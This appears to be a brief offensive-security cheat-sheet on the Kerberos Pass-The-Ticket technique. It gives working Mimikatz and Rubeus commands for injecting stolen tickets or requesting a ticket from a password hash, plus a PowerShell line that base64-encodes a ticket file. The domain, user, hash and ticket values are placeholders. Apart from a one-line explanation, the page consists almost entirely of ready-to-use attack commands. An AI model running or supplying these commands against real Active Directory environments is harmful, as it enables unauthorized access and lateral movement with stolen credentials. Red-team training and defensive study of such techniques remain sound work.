# Pass The Ticket

## <mark style="color:yellow;">About</mark>

<mark style="color:green;">**Pass-The-Ticket**</mark> in contrast of <mark style="color:green;">**Pass-The-Hash**</mark> and <mark style="color:green;">**Overpass-The-Hash**</mark> use a ticket to gain access to the TGS and then for service.

## <mark style="color:yellow;">Mimikatz</mark>

```
kerberos::ptt "C:\Users\v17\Desktop\Mimikatz\[0;7f830]-5-2-43f10000-v17@krbtgt-amogus.kek.kirbi"
```

## <mark style="color:yellow;">Rubeus</mark>

### <mark style="color:blue;">Using Hash</mark>

```
Rubeus.exe asktgt /domain:amogus.kek /user:v17 /rc4:1293uo1uwfoi1hw081 /ptt
```

Unlike command for <mark style="color:green;">**Overpass-The-Hash**</mark>, here we are using <mark style="color:red;">**/ptt**</mark> to do both <mark style="color:green;">**Overpass-The-Hash**</mark> and <mark style="color:green;">**Pass-The-Ticket**</mark> simultaneously. But that only works if we give <mark style="color:red;">**/hash**</mark>: instead of ticket

### <mark style="color:blue;">Using Ticket</mark>

```powershell
Rubeus.exe ptt /ticket:[0;7f830]-5-2-43f10000-v17@krbtgt-amogus.kek.kirbi
```

### <mark style="color:blue;">Using Encoded Ticket</mark>

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("[0;7f830]-5-2-43f10000-v17@krbtgt-amogus.kek.kirbi"))
```

```powershell
Rubeus.exe ptt /ticket:LETSIMAGINETHISISOURBASE64ENCODEDKERBEROSTICKET
```
